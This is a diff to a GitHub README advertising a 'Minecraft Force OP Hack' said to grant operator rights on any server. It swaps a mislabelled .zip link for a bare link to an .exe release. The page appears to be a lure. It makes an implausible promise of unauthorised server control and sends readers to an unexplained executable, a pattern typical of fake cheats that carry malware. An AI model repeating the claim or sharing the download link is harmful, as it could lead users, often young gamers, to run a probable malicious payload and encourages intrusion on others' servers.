@@ -1,7 +1,7 @@
 # Minecraft-Force-OP-Hack
 Minecraft Fore OP hack - How to get OP on any minecraft server
 
-Download from here: [https://github.com/softcure1337/Minecraft-Force-OP-Hack/releases/download/v1.0.0/MinecraftforceOP.zip](https://github.com/softcure1337/Minecraft-Force-OP-Hack/releases/download/v1.0.0/MinecraftforceOP.exe)
+Download from here: https://github.com/softcure1337/Minecraft-Force-OP-Hack/releases/download/v1.0.0/MinecraftforceOP.exe
 
 
 
